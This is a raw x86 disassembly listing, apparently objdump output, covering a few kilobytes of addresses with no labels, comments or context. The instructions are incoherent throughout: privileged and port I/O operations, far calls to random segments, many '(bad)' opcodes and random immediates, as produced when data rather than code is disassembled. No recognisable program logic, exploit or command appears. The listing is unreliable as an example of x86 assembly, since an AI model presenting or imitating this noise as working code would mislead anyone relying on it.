  4184d4:	cmp    ecx,DWORD PTR [edi+0x314e4a5b]
  4184da:	mov    edi,0x41ea44c9
  4184df:	call   0x6ce4:0x5dd994d5
  4184e6:	jne    0x418554
  4184e8:	repz adc bh,dl
  4184eb:	mov    WORD PTR [ebx+0x14d27e6e],gs
  4184f1:	jae    0x41850b
  4184f3:	xchg   dh,ah
  4184f5:	sti    
  4184f6:	adc    dh,cl
  4184f8:	dec    esi
  4184f9:	outs   dx,DWORD PTR ds:[esi]
  4184fa:	jnp    0x4184ca
  4184fc:	and    BYTE PTR [ebx],0xd5
  4184ff:	jmp    0x418549
  418501:	mov    cl,0x3c
  418503:	push   ebx
  418504:	mov    esp,0x5efc0b1b
  418509:	fmul   DWORD PTR [ecx+0x49e1f9c2]
  41850f:	cmc    
  418510:	lea    ebx,[edx-0x15799b2a]
  418516:	fstp   QWORD PTR [edi+0x50]
  418519:	rcr    DWORD PTR [ebp+eax*4-0x11],cl
  41851d:	inc    eax
  41851e:	stos   BYTE PTR es:[edi],al
  41851f:	dec    ecx
  418520:	push   es
  418521:	and    ebx,DWORD PTR [edx+0xbb030a1]
  418527:	and    ecx,eax
  418529:	xchg   edi,eax
  41852a:	and    bh,BYTE PTR [edx+0xf]
  41852d:	cld    
  41852e:	cwde   
  41852f:	push   esp
  418530:	add    eax,0xabcd7f52
  418535:	rol    ecx,0x5e
  418538:	mov    edx,0x42e15290
  41853d:	pop    es
  41853e:	add    edi,DWORD PTR [ebp+0x2c]
  418541:	dec    ecx
  418542:	or     al,0xb0
  418544:	sub    eax,ecx
  418546:	fld    QWORD PTR [edx+0x22ade8df]
  41854c:	or     BYTE PTR [esi-0x45],dh
  41854f:	std    
  418550:	mov    al,ds:0x8c4dfe93
  418555:	ss adc DWORD PTR es:[edi-0x23],0x508f461a
  41855e:	daa    
  41855f:	dec    esp
  418560:	mov    cs,ecx
  418562:	push   ds
  418563:	daa    
  418564:	pop    edi
  418565:	push   esi
  418566:	push   ds
  418567:	sar    BYTE PTR [ebx+eiz*1],0xc
  41856b:	mov    ecx,0x4bc1aed6
  418570:	dec    edi
  418571:	or     edx,esp
  418573:	add    ebx,0x5b
  418576:	lods   al,BYTE PTR ds:[esi]
  418577:	clc    
  418578:	pusha  
  418579:	add    DWORD PTR [eax+ecx*1+0x5e],edx
  41857d:	rol    DWORD PTR [ebx],1
  41857f:	(bad)  
  418580:	mov    ebp,0x36044998
  418585:	mov    ds:0x835233fc,al
  41858a:	aam    0x66
  41858c:	add    bh,BYTE PTR ds:0x38304b33
  418592:	shl    BYTE PTR [edx],cl
  418594:	sti    
  418595:	mov    WORD PTR ds:0x13f12f10,?
  41859b:	repnz sub BYTE PTR ds:[edx],ah
  41859f:	xor    eax,0x60c15a8c
  4185a4:	pop    edx
  4185a5:	test   DWORD PTR [edx-0x6509ceba],esi
  4185ab:	xchg   DWORD PTR [ebx+0x5f5436dc],ebp
  4185b1:	sub    ebp,DWORD PTR [eax]
  4185b3:	aad    0x3
  4185b5:	fstp   QWORD PTR [ebp+eax*1-0x56]
  4185b9:	cmp    ebx,DWORD PTR [eax+0x3b]
  4185bc:	mov    WORD PTR ds:0x37de0b1b,es
  4185c2:	sub    cl,BYTE PTR [edi+0x6f]
  4185c5:	pop    esp
  4185c6:	push   0x64
  4185c8:	fsub   QWORD PTR [esi-0x7d]
  4185cb:	daa    
  4185cc:	shl    DWORD PTR [edi],cl
  4185ce:	scas   al,BYTE PTR es:[edi]
  4185cf:	push   edi
  4185d0:	aad    0xf1
  4185d2:	jge    0x4185b1
  4185d4:	shr    DWORD PTR ds:0x86e97f2c,0x6e
  4185db:	cmp    al,0xd7
  4185dd:	fld    DWORD PTR [ebp+ebp*2-0x27]
  4185e1:	stos   DWORD PTR es:[edi],eax
  4185e2:	jle    0x418583
  4185e4:	mov    ah,0x29
  4185e6:	call   0x459e:0xed0ea1ce
  4185ed:	jge    0x4185c1
  4185ef:	jl     0x4185ee
  4185f1:	jecxz  0x41862e
  4185f3:	xchg   edi,eax
  4185f4:	inc    edi
  4185f5:	inc    edx
  4185f6:	jl     0x418656
  4185f8:	adc    DWORD PTR [esi+0x36],esi
  4185fb:	jle    0x4185e4
  4185fd:	jns    0x41860f
  4185ff:	adc    al,0x22
  418601:	mov    al,ds:0xe5522c4e
  418606:	push   ss
  418607:	sbb    DWORD PTR [ebx-0x139463e7],0x383b452c
  418611:	inc    edx
  418612:	xchg   ebp,eax
  418613:	push   edi
  418614:	sti    
  418615:	je     0x418681
  418617:	xor    esp,ecx
  418619:	iret   
  41861a:	data16 fs sub ah,bh
  41861e:	stc    
  41861f:	aas    
  418620:	mov    ds:0xd27ba16e,eax
  418625:	pop    ds
  418626:	mov    edi,0xc3f95a4a
  41862b:	div    cl
  41862d:	(bad)  
  41862e:	test   BYTE PTR [ecx-0x1aa76256],ah
  418634:	xor    BYTE PTR [ebp+eax*4+0x5627283c],dh
  41863b:	adc    ecx,ecx
  41863d:	lahf   
  41863e:	cmp    eax,0xd2f247c1
  418643:	out    0x35,eax
  418645:	js     0x418653
  418647:	call   0x6bc761b1
  41864c:	clc    
  41864d:	sbb    dh,bh
  41864f:	adc    DWORD PTR [ebx-0x7d],ecx
  418652:	or     eax,0x6e990e9d
  418657:	xchg   esi,eax
  418658:	add    eax,0x410f20a4
  41865d:	sbb    ebx,DWORD PTR [esi]
  41865f:	out    dx,eax
  418660:	test   eax,0x83310253
  418665:	adc    al,0xb8
  418667:	leave  
  418668:	jmp    0x89dd:0xe8ce628d
  41866f:	sbb    cl,BYTE PTR [ebx]
  418671:	rcl    DWORD PTR [ebx],0x5
  418674:	mov    cl,0x87
  418676:	jno    0x4186ba
  418678:	leave  
  418679:	mov    fs,WORD PTR [eax-0x3b44321d]
  41867f:	js     0x41869c
  418681:	bound  ebx,QWORD PTR [edi]
  418683:	ins    BYTE PTR es:[edi],dx
  418684:	pusha  
  418685:	add    BYTE PTR [ebx+0xf],bh
  418688:	dec    ebp
  418689:	aas    
  41868a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41868b:	pop    ds
  41868c:	(bad)  
  41868d:	mov    esi,0xcd432c1f
  418692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418694:	sub    al,0x1c
  418696:	jnp    0x418686
  418698:	xor    ebx,DWORD PTR [eax+0x1137b460]
  41869e:	add    edi,DWORD PTR [ebx-0x1e]
  4186a1:	loope  0x418630
  4186a3:	loope  0x418665
  4186a5:	and    eax,0xfa7e7447
  4186aa:	adc    ch,BYTE PTR [eax-0x66]
  4186ad:	std    
  4186ae:	sahf   
  4186af:	data16 cmp BYTE PTR [ebp-0x2e799db1],0xf
  4186b7:	jb     0x41865d
  4186b9:	es (bad) 
  4186bb:	inc    DWORD PTR [edi+ebp*4]
  4186be:	les    esp,FWORD PTR [eax]
  4186c0:	test   BYTE PTR [ebx],al
  4186c2:	push   esp
  4186c3:	cvtps2pi mm3,QWORD PTR [esi]
  4186c6:	gs ss (bad) 
  4186c9:	mov    bh,0xae
  4186cb:	add    DWORD PTR [ebp-0x27],edx
  4186ce:	jmp    0x41870b
  4186d0:	xchg   esi,eax
  4186d1:	inc    ecx
  4186d2:	jbe    0x418674
  4186d4:	dec    dx
  4186d6:	or     eax,DWORD PTR [edx-0x3fa113ee]
  4186dc:	mov    DWORD PTR [esi+0x27],ebp
  4186df:	xchg   al,dh
  4186e1:	repnz aam 0x98
  4186e4:	shl    DWORD PTR [edi+edi*4],0xb8
  4186e8:	inc    edi
  4186e9:	xchg   esi,eax
  4186ea:	xchg   esp,eax
  4186eb:	and    eax,0xbd9fbd25
  4186f0:	not    BYTE PTR [esi+0x1a85e017]
  4186f6:	or     al,0x5b
  4186f8:	jae    0x418760
  4186fa:	ss aam 0x6f
  4186fd:	mov    ah,0x99
  4186ff:	push   esi
  418700:	mov    BYTE PTR [edi-0xdd4afba],ch
  418706:	lods   al,BYTE PTR ds:[esi]
  418707:	enter  0xa456,0xeb
  41870b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41870c:	repz call 0xaaa00680
  418712:	jmp    0x9a1c:0xb97ac298
  418719:	stc    
  41871a:	and    ah,dl
  41871c:	iret   
  41871d:	mov    ?,WORD PTR [ebx+0x296da4f4]
  418723:	dec    esi
  418724:	mov    al,0x96
  418726:	popa   
  418727:	cs int 0x57
  41872a:	aas    
  41872b:	push   0xe88a8159
  418730:	mov    ebp,0xc9253447
  418735:	add    eax,0x30fd66e7
  41873a:	out    dx,eax
  41873b:	aas    
  41873c:	push   ecx
  41873d:	leave  
  41873e:	pop    ebx
  41873f:	icebp  
  418740:	jle    0x4187ab
  418742:	cmp    eax,0x784c199a
  418747:	pop    ecx
  418748:	sub    esi,esi
  41874a:	xor    eax,0x8abcba03
  41874f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418750:	jnp    0x41877d
  418752:	sub    esp,DWORD PTR [ebx+0x0]
  418755:	add    eax,0x163da2a3
  41875a:	cmc    
  41875b:	rol    DWORD PTR [edx],1
  41875d:	cmp    al,BYTE PTR [edi+0x54f0fd03]
  418763:	fistp  WORD PTR [edx+esi*2]
  418766:	xchg   ecx,eax
  418767:	push   esp
  418768:	inc    ebx
  418769:	mov    al,ds:0xff5dc525
  41876f:	adc    bh,ch
  418771:	jl     0x418736
  418773:	inc    esp
  418774:	sub    eax,0x981b90b0
  418779:	sub    DWORD PTR [eax],esi
  41877b:	cmp    DWORD PTR [esi],0x450171d7
  418781:	out    0x73,al
  418783:	and    eax,ecx
  418785:	adc    eax,0x98167e9d
  41878a:	mov    al,0xcd
  41878c:	adc    DWORD PTR [ebp-0x1a],esi
  41878f:	add    eax,DWORD PTR [eax+0x32b5f124]
  418795:	call   0xad7c66c3
  41879a:	push   edi
  41879b:	cmp    ebp,esi
  41879d:	shl    BYTE PTR [esi+0x4f8b0387],cl
  4187a3:	aas    
  4187a4:	lds    ebp,FWORD PTR [ebp-0x6c1dc196]
  4187aa:	in     eax,dx
  4187ab:	or     DWORD PTR [edx],0x33
  4187ae:	out    0x1e,eax
  4187b0:	lods   al,BYTE PTR ds:[esi]
  4187b1:	sar    ebp,0xd3
  4187b4:	inc    ecx
  4187b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187b6:	pop    eax
  4187b7:	xor    dh,bl
  4187b9:	push   ds
  4187ba:	sub    al,BYTE PTR [edx-0x26]
  4187bd:	pop    ecx
  4187be:	cmp    al,0x19
  4187c0:	cmp    ch,BYTE PTR [ecx]
  4187c2:	mov    dl,0x1a
  4187c4:	pop    es
  4187c5:	and    ebx,ebx
  4187c7:	fstp   QWORD PTR [edx-0x3b]
  4187ca:	mov    ebp,0xdca7f078
  4187cf:	loope  0x4187cd
  4187d1:	lds    esi,FWORD PTR [ebp+0x14]
  4187d4:	mov    eax,ds:0x426f44fd
  4187d9:	push   eax
  4187da:	fbstp  TBYTE PTR ds:0x82b229ce
  4187e0:	loopne 0x4187b1
  4187e2:	call   0xca60:0xb863ee96
  4187e9:	cwde   
  4187ea:	mov    al,ds:0x3b324261
  4187ef:	sbb    eax,ebx
  4187f1:	std    
  4187f2:	or     edi,0xb731beae
  4187f8:	or     ch,BYTE PTR [esi+0x59]
  4187fb:	fwait
  4187fc:	arpl   WORD PTR [esp+ebp*2-0x73],ax
  418800:	cdq    
  418801:	xor    eax,0xa16fedf4
  418806:	jmp    0x4187d8
  418808:	loope  0x4187c6
  41880a:	(bad)  
  41880b:	jle    0x4187d5
  41880d:	jmp    0x5a4:0x10bb6024
  418814:	daa    
  418815:	cdq    
  418816:	std    
  418817:	or     dl,BYTE PTR [eax+0x48]
  41881a:	loop   0x41882c
  41881c:	jae    0x41886e
  41881e:	inc    edi
  41881f:	aas    
  418820:	dec    ebx
  418821:	mov    edi,0x9ff9dd86
  418826:	cmp    al,0x59
  418828:	mov    ecx,0x2cd33fd9
  41882d:	jg     0x41888f
  41882f:	loopne 0x418894
  418831:	mov    ds:0x547592af,eax
  418836:	in     al,0x2d
  418838:	sbb    BYTE PTR [edi],0x0
  41883b:	pop    ss
  41883c:	and    ebx,DWORD PTR [ecx+0x651aa533]
  418842:	lea    edx,[ebp+0x49d960f5]
  418848:	jle    0x418845
  41884a:	sub    BYTE PTR [edx+ecx*2-0x218c8d7e],dl
  418851:	xchg   eax,ebp
  418853:	sbb    al,0x5c
  418855:	pop    ebp
  418856:	or     edi,DWORD PTR [ebx+0x37]
  418859:	jl     0x418889
  41885b:	xor    dl,dh
  41885d:	push   edi
  41885e:	adc    al,0x6b
  418860:	out    0xe3,al
  418862:	dec    edi
  418863:	fadd   QWORD PTR [ebx]
  418865:	pop    ss
  418866:	out    dx,eax
  418867:	aas    
  418868:	scas   eax,DWORD PTR es:[edi]
  418869:	jle    0x418876
  41886b:	sbb    BYTE PTR [esi+edx*1],bl
  41886e:	mov    ebp,0x17f9928f
  418873:	ja     0x4188b9
  418875:	sub    dh,BYTE PTR [edi+0x5e]
  418878:	pop    es
  418879:	arpl   ax,bp
  41887b:	inc    ebp
  41887c:	nop
  41887d:	pop    ds
  41887e:	and    dh,BYTE PTR [esi-0x19aadfbc]
  418884:	das    
  418885:	(bad)  [ebx-0x1b]
  418888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418889:	xlat   BYTE PTR ds:[ebx]
  41888a:	add    bh,ch
  41888c:	call   0xb3a9a1a9
  418891:	mov    es,WORD PTR [ecx]
  418893:	lahf   
  418894:	popa   
  418895:	jmp    0x41890e
  418897:	push   0x9498d18
  41889c:	pop    esi
  41889d:	loopne 0x41891c
  41889f:	sbb    eax,DWORD PTR [ecx+edx*4]
  4188a2:	in     al,dx
  4188a3:	rol    DWORD PTR [esi],0x1
  4188a6:	ss jge 0x4188a8
  4188a9:	or     eax,0x4cad1a19
  4188ae:	fcmove st,st(0)
  4188b0:	arpl   WORD PTR [eax-0x1b],cx
  4188b3:	dec    esp
  4188b4:	aaa    
  4188b5:	mov    ecx,0x687beac5
  4188ba:	loopne 0x4188ec
  4188bc:	push   edi
  4188bd:	aas    
  4188be:	xchg   eax,esi
  4188c0:	loop   0x418920
  4188c2:	(bad)  
  4188c3:	and    bh,bl
  4188c5:	(bad)  
  4188c6:	xor    cl,BYTE PTR [esi]
  4188c8:	fistp  DWORD PTR [ecx]
  4188ca:	add    al,0x7
  4188cc:	lods   al,BYTE PTR ds:[esi]
  4188cd:	cwde   
  4188ce:	push   0xffffffe0
  4188d0:	inc    esp
  4188d1:	sub    DWORD PTR [ebx+0x36],0x7ffc4af0
  4188d8:	lods   eax,DWORD PTR ds:[esi]
  4188d9:	std    
  4188da:	stc    
  4188db:	pop    ds
  4188dc:	mov    ds:0xbbd5ae8d,eax
  4188e1:	repnz xchg edi,eax
  4188e3:	retf   
  4188e4:	pop    ebp
  4188e5:	xchg   ebx,eax
  4188e6:	xchg   ebp,eax
  4188e7:	loop   0x418902
  4188e9:	leave  
  4188ea:	in     al,0x83
  4188ec:	lods   eax,DWORD PTR ds:[esi]
  4188ed:	add    bl,ch
  4188ef:	jp     0x41894c
  4188f1:	dec    eax
  4188f2:	pushf  
  4188f3:	icebp  
  4188f4:	ds loop 0x4188da
  4188f7:	les    ebx,FWORD PTR [ebx+0x6c]
  4188fa:	jno    0x41896e
  4188fc:	fcmovbe st,st(7)
  4188fe:	test   ebp,0x870f1f15
  418904:	rol    BYTE PTR [ebx+0x53],0xb6
  418908:	test   al,0xf3
  41890a:	pop    es
  41890b:	sbb    dl,BYTE PTR [ecx]
  41890d:	cdq    
  41890e:	jb     0x41891a
  418910:	int    0x3b
  418912:	adc    BYTE PTR [ecx+0x4f],0x15
  418916:	les    edx,FWORD PTR [edx+ebp*2]
  418919:	xor    eax,0xfa0222a
  41891e:	mov    dh,0xed
  418920:	fwait
  418921:	pushf  
  418922:	(bad)  
  418923:	mov    esi,0x65db0c7c
  418928:	aas    
  418929:	add    al,0x9d
  41892b:	inc    esp
  41892c:	cdq    
  41892d:	jg     0x418970
  41892f:	jbe    0x418948
  418931:	mov    bl,0xd0
  418933:	or     ch,ah
  418935:	jno    0x418991
  418937:	scas   eax,DWORD PTR es:[edi]
  418938:	aas    
  418939:	outs   dx,BYTE PTR ds:[esi]
  41893a:	stc    
  41893b:	(bad)  
  41893c:	out    dx,al
  41893d:	mov    WORD PTR [esi],cs
  41893f:	xchg   ebp,eax
  418940:	test   dl,ah
  418942:	mov    ch,0x49
  418944:	int3   
  418945:	cmp    edx,esp
  418947:	ja     0x4188cb
  418949:	sbb    dl,ah
  41894b:	xchg   edx,eax
  41894c:	xlat   BYTE PTR ds:[ebx]
  41894d:	xchg   sp,ax
  41894f:	arpl   WORD PTR [ecx+0x3c],cx
  418952:	xor    eax,0x8ff0bb91
  418957:	das    
  418958:	mov    ebx,0x4725d3c7
  41895d:	jmp    0x6341:0xbf4f85be
  418964:	xlat   BYTE PTR ds:[ebx]
  418965:	lock jae 0x418967
  418968:	add    al,0x7
  41896a:	pop    esi
  41896b:	add    eax,0x2782ccca
  418970:	jno    0x41898d
  418972:	mov    DWORD PTR [ecx+0x5e],ecx
  418975:	and    BYTE PTR ds:0x36337851,bh
  41897b:	scas   eax,DWORD PTR es:[edi]
  41897c:	cmc    
  41897d:	leave  
  41897e:	imul   edx,esi,0xd3e1dcbc
  418984:	lea    ebp,[edi+0x7d3e151d]
  41898a:	ret    
  41898b:	xor    eax,0x1c16cc8a
  418990:	jns    0x418998
  418992:	out    dx,al
  418993:	repnz adc edx,DWORD PTR [eax+0x3ecb98e1]
  41899a:	mov    edx,gs
  41899c:	fwait
  41899d:	clc    
  41899e:	jp     0x41899b
  4189a0:	jb     0x4189e4
  4189a2:	retf   0x33cb
  4189a5:	cmp    BYTE PTR [ebp+0x3ad13fb3],cl
  4189ab:	xchg   esp,eax
  4189ac:	jle    0x41894a
  4189ae:	xor    eax,0x2ddd35e3
  4189b3:	out    dx,eax
  4189b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189b5:	ins    BYTE PTR es:[edi],dx
  4189b6:	aam    0xed
  4189b8:	pusha  
  4189b9:	xchg   edx,eax
  4189ba:	sub    BYTE PTR [ecx-0x3],bh
  4189bd:	jmp    0xf32751aa
  4189c2:	sahf   
  4189c3:	push   ebx
  4189c4:	xor    DWORD PTR [ebx+0x3],edx
  4189c7:	stc    
  4189c8:	into   
  4189c9:	jae    0x4189d6
  4189cb:	imul   edi,DWORD PTR [eax],0x3f
  4189ce:	loopne 0x418a48
  4189d0:	inc    ebx
  4189d1:	mov    ch,0x40
  4189d3:	add    bh,al
  4189d5:	pop    ebx
  4189d6:	mov    ebp,0x779cc254
  4189db:	in     al,dx
  4189dc:	or     BYTE PTR [ebp+0x7ae679a9],cl
  4189e2:	cmp    DWORD PTR [ecx+0x4c0f00ae],ebp
  4189e8:	mov    esp,0x8e8d7215
  4189ed:	sub    BYTE PTR [ebx-0x9],cl
  4189f0:	xchg   ecx,eax
  4189f1:	mov    esp,0x7c1a7657
  4189f6:	and    ah,BYTE PTR [ebx+0x32]
  4189f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189fb:	inc    esi
  4189fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fd:	(bad)  
  4189fe:	outs   dx,BYTE PTR ds:[esi]
  4189ff:	pop    ds
  418a00:	out    0x53,eax
  418a02:	ror    edx,1
  418a04:	test   al,0x5
  418a06:	fiadd  WORD PTR [ebx]
  418a08:	xor    DWORD PTR [ecx-0x26],0x206ccaff
  418a0f:	scas   eax,DWORD PTR es:[edi]
  418a10:	imul   edi,DWORD PTR [ebp+0x6d],0x1a
  418a14:	scas   eax,DWORD PTR es:[edi]
  418a15:	jae    0x418a3b
  418a17:	(bad)  
  418a19:	xchg   ebp,eax
  418a1a:	dec    ecx
  418a1b:	pop    edi
  418a1c:	pop    edx
  418a1d:	jmp    0x418a19
  418a1f:	out    0xcd,al
  418a21:	xor    DWORD PTR [ecx-0x7cc147f9],ebp
  418a27:	loopne 0x418a9c
  418a29:	push   eax
  418a2a:	es jb  0x418a38
  418a2d:	ja     0x418a54
  418a2f:	inc    ebx
  418a30:	aam    0x2
  418a32:	stc    
  418a33:	call   0x24077cb8
  418a38:	jmp    0x9179:0x5d6149b0
  418a3f:	or     dl,BYTE PTR [edi+0x79c3cff2]
  418a45:	mov    bh,0xdc
  418a47:	add    esi,DWORD PTR ds:0x5c1e50a3
  418a4d:	xchg   ebp,eax
  418a4e:	pop    ds
  418a4f:	sahf   
  418a50:	xchg   edi,eax
  418a51:	adc    ch,BYTE PTR [ebx+0x4c]
  418a54:	dec    ebx
  418a55:	jo     0x418a3c
  418a57:	ins    DWORD PTR es:[edi],dx
  418a58:	aaa    
  418a59:	dec    ecx
  418a5a:	mov    BYTE PTR [ecx-0x2bb3c76c],dl
  418a60:	dec    edx
  418a61:	mov    si,0x9725
  418a65:	mov    dl,0xa9
  418a67:	mov    ds:0x1a1bfe06,eax
  418a6c:	inc    eax
  418a6d:	rcl    DWORD PTR [ebp+0x47],1
  418a70:	sub    dl,BYTE PTR [ecx-0x7]
  418a73:	add    ah,BYTE PTR [eax+esi*4+0x5c]
  418a77:	fmul   QWORD PTR [edx]
  418a79:	bound  ebx,QWORD PTR [ebx]
  418a7b:	xchg   DWORD PTR [esi+0x523da4b],edx
  418a81:	mov    cl,0x8d
  418a83:	imul   esi,DWORD PTR [ebx],0xffffffa7
  418a86:	fistp  DWORD PTR [edi]
  418a88:	rol    DWORD PTR [ebp+0x6ef04a7],0xd5
  418a8f:	xor    al,BYTE PTR [esi-0x4ce4f511]
  418a95:	loopne 0x418a2f
  418a97:	mov    esp,0x767e8ec7
  418a9c:	shl    BYTE PTR ds:0xc4edab16,cl
  418aa2:	and    esp,edx
  418aa4:	hlt    
  418aa5:	test   al,0xac
  418aa7:	sti    
  418aa8:	mov    ds:0x8bdc198a,al
  418aad:	or     BYTE PTR [edi-0x47e9c5fa],ch
  418ab3:	add    eax,ebp
  418ab5:	shl    DWORD PTR [esi],cl
  418ab7:	pop    esp
  418ab8:	mov    ds:0xec3c56be,al
  418abd:	inc    ebp
  418abe:	pop    edi
  418abf:	jae    0x418abb
  418ac1:	jl     0x418a78
  418ac3:	inc    esp
  418ac4:	imul   ecx,DWORD PTR [edx+0x67],0xa5526ce7
  418acb:	add    BYTE PTR ds:0xff5bb983,ah
  418ad1:	call   FWORD PTR [ecx-0x3f]
  418ad4:	mov    ah,ch
  418ad6:	popa   
  418ad7:	retf   0x5d4b
  418ada:	inc    edx
  418adb:	in     al,0x46
  418add:	jne    0x418ad6
  418adf:	jge    0x418a93
  418ae1:	iret   
  418ae2:	mov    edi,0xa3f8e7e3
  418ae7:	repnz cmp eax,0x718fe821
  418aed:	neg    esi
  418aef:	mov    ebp,0xf4c13f8b
  418af4:	mov    dh,0xab
  418af6:	inc    eax
  418af7:	jbe    0x418af5
  418af9:	push   edx
  418afa:	les    edi,FWORD PTR [ecx+ecx*8]
  418afd:	repnz ficom WORD PTR [edx+eiz*4-0x254fd011]
  418b05:	xchg   ebx,eax
  418b06:	sub    BYTE PTR [eax+0x6c],cl
  418b09:	mov    bl,0x93
  418b0b:	std    
  418b0c:	jecxz  0x418aef
  418b0e:	fst    DWORD PTR [esi-0x327e893a]
  418b14:	leave  
  418b15:	int3   
  418b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b17:	inc    ecx
  418b18:	stos   BYTE PTR es:[edi],al
  418b19:	out    dx,eax
  418b1a:	cmc    
  418b1b:	or     DWORD PTR [edx+edx*4+0x7696630f],esp
  418b22:	cs cdq 
  418b24:	aaa    
  418b25:	mov    edx,0x643998e7
  418b2a:	pusha  
  418b2b:	gs cdq 
  418b2d:	or     eax,0xcc42fc85
  418b32:	add    BYTE PTR [eax+eiz*1+0x59],cl
  418b36:	dec    eax
  418b37:	jb     0x418acd
  418b39:	adc    DWORD PTR [ebx-0x68],ebp
  418b3c:	push   0x69
  418b3e:	jbe    0x418b4c
  418b40:	mov    edi,DWORD PTR [eax-0x17]
  418b43:	sub    eax,0x2f4e7e41
  418b48:	js     0x418b85
  418b4a:	lahf   
  418b4b:	push   esp
  418b4c:	nop
  418b4d:	dec    ecx
  418b4e:	vaddsd xmm1,xmm0,xmm2
  418b52:	pop    edi
  418b53:	shr    BYTE PTR [ecx+ebx*8+0x399f5bb9],0xf1
  418b5b:	sbb    BYTE PTR [ebx-0x6d],dh
  418b5e:	popa   
  418b5f:	clc    
  418b60:	clc    
  418b61:	inc    ebp
  418b62:	lods   eax,DWORD PTR ds:[esi]
  418b63:	jle    0x418b9e
  418b65:	les    ebp,FWORD PTR [ecx]
  418b67:	inc    ebx
  418b68:	es jg  0x418b4c
  418b6b:	push   ss
  418b6c:	push   cs
  418b6d:	adc    DWORD PTR ds:0x7d6a3013,edx
  418b73:	mov    al,ds:0x82846cb5
  418b78:	adc    al,0xc2
  418b7a:	loope  0x418b68
  418b7c:	and    DWORD PTR [ebx-0x52a0aa1c],0xea944b71
  418b86:	mov    cl,dl
  418b88:	adc    ah,ch
  418b8a:	scas   al,BYTE PTR es:[edi]
  418b8b:	arpl   bx,si
  418b8d:	xchg   ebx,eax
  418b8e:	call   0xe834:0xe17f12b9
  418b95:	push   ebx
  418b96:	jl     0x418bdd
  418b98:	daa    
  418b99:	sbb    bh,BYTE PTR [edi-0x5a9d47db]
  418b9f:	inc    ebx
  418ba0:	(bad)  
  418ba1:	bnd jg 0x418b6d
  418ba4:	mov    ah,dh
  418ba6:	(bad)  
  418ba7:	in     eax,0xca
  418ba9:	and    BYTE PTR [ecx-0x189ed9ee],ch
  418baf:	jecxz  0x418b45
  418bb1:	jno    0x418bac
  418bb3:	stos   BYTE PTR es:[edi],al
  418bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb5:	and    eax,0xd336afb1
  418bba:	fidivr DWORD PTR [edx+0x6]
  418bbd:	push   ecx
  418bbe:	add    al,0x7b
  418bc0:	lds    edi,FWORD PTR [ebx]
  418bc2:	xor    ebx,DWORD PTR [esi+0x3d]
  418bc5:	sbb    BYTE PTR [ecx],0xe
  418bc8:	inc    ecx
  418bc9:	jge    0x418b61
  418bcb:	gs xchg edx,eax
  418bcd:	cdq    
  418bce:	and    bh,dl
  418bd0:	mov    ah,0x54
  418bd2:	iret   
  418bd3:	and    eax,0x53bdef6d
  418bd8:	sub    BYTE PTR [edi-0x71],dl
  418bdb:	xor    DWORD PTR [ecx+ecx*4],0x90fd4e13
  418be2:	mov    al,ds:0xbda99982
  418be7:	add    BYTE PTR [eax],dl
  418be9:	std    
  418bea:	cwde   
  418beb:	xor    ecx,DWORD PTR [edi+0x60]
  418bee:	arpl   WORD PTR [ebp+0x68fa4cc1],si
  418bf4:	les    eax,FWORD PTR [ebx]
  418bf6:	loop   0x418c55
  418bf8:	hlt    
  418bf9:	jmp    0xab4609c
  418bfe:	adc    DWORD PTR ds:0x60ceb920,esi
  418c04:	pop    ds
  418c05:	pop    ebx
  418c06:	xor    bh,dl
  418c08:	jle    0x418c14
  418c0a:	mov    DWORD PTR [edx],esi
  418c0c:	je     0x418c6e
  418c0e:	jecxz  0x418c2b
  418c10:	xor    al,0xb6
  418c12:	lods   al,BYTE PTR ds:[esi]
  418c13:	and    ebx,ecx
  418c15:	mov    ds:0xd26d8324,al
  418c1a:	or     bl,BYTE PTR ds:0xd98de5ff
  418c20:	js     0x418c0d
  418c22:	cs test al,0x69
  418c25:	lock nop
  418c27:	dec    esp
  418c28:	int3   
  418c29:	xor    al,0xb8
  418c2b:	sub    DWORD PTR [ecx],esp
  418c2d:	lods   eax,DWORD PTR ds:[esi]
  418c2e:	cdq    
  418c2f:	in     eax,dx
  418c30:	stos   BYTE PTR es:[edi],al
  418c31:	ret    0x2682
  418c34:	mov    eax,0x51b57b98
  418c39:	(bad)
  418c3c:	inc    esi
  418c3d:	hlt    
  418c3e:	jnp    0x418cbd
  418c40:	sub    ch,bl
  418c42:	call   0x35d64b42
  418c47:	cmp    BYTE PTR [edi+0x35465dbd],ah
  418c4d:	dec    ecx
  418c4e:	inc    eax
  418c4f:	icebp  
  418c50:	and    al,0xdb
  418c52:	ret    0x9aa7
  418c55:	add    edx,edx
  418c57:	imul   edi,DWORD PTR [ecx],0x142ef4f5
  418c5d:	mov    ebp,0xc5af73b9
  418c62:	enter  0xf764,0xd5
  418c66:	mov    eax,ds:0xe503743e
  418c6b:	and    dl,BYTE PTR [edi]
  418c6d:	aad    0x30
  418c6f:	std    
  418c70:	pop    ds
  418c71:	ret    0x6eed
  418c74:	lea    ebx,[esi+0x53]
  418c77:	mov    WORD PTR [esi],fs
  418c79:	pop    ecx
  418c7a:	outs   dx,BYTE PTR ds:[esi]
  418c7b:	cld    
  418c7c:	cmp    BYTE PTR [ecx+0x50],bh
  418c7f:	sbb    al,0x5c
  418c81:	out    0x58,al
  418c83:	loope  0x418c8b
  418c85:	inc    edx
  418c86:	dec    ecx
  418c87:	dec    esp
  418c88:	adc    eax,0xc09748ba
  418c8d:	xchg   ebx,eax
  418c8e:	fld    DWORD PTR [edi+0x79c2122e]
  418c94:	xor    ah,BYTE PTR [ecx+0x1b46ca71]
  418c9a:	aam    0xdb
  418c9c:	ret    0x73f9
  418c9f:	xchg   ecx,eax
  418ca0:	mov    ah,BYTE PTR [ebx-0x3a8b4e1d]
  418ca6:	test   eax,0x13a73130
  418cab:	add    ecx,edi
  418cad:	xor    eax,0xed1ee79e
  418cb2:	mov    DWORD PTR [ecx-0x5a],edi
  418cb5:	inc    esp
